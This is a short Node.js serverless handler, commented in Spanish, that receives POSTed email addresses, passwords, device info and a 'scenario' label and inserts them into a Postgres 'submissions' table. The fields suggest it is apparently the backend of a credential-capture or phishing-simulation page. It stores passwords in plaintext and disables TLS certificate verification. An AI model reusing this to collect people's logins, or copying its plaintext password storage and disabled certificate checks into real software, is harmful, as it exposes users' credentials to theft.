import { Pool } from 'pg';

const pool = new Pool({
  connectionString: process.env.POSTGRES_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

export default async function handler(request, response) {
  if (request.method !== 'POST') {
    return response.status(405).json({ message: 'Método no permitido' });
  }

  // Extrae los datos que envía el frontend desde el cuerpo (body) de la petición
  const { email, password, device_info, scenario } = request.body;

  try {
    // Crea la consulta SQL para insertar los datos de forma segura (evita inyección SQL)
    const query = 'INSERT INTO submissions (email, password, device_info, scenario) VALUES ($1, $2, $3, $4)';
    const values = [email, password, device_info, scenario];
    
    // Ejecuta la consulta
    await pool.query(query, values);

    response.status(200).json({ message: 'Datos guardados correctamente' });
  } catch (error) {
    console.error('Error en la base de datos:', error);
    response.status(500).json({ message: 'Error interno del servidor' });
  }
}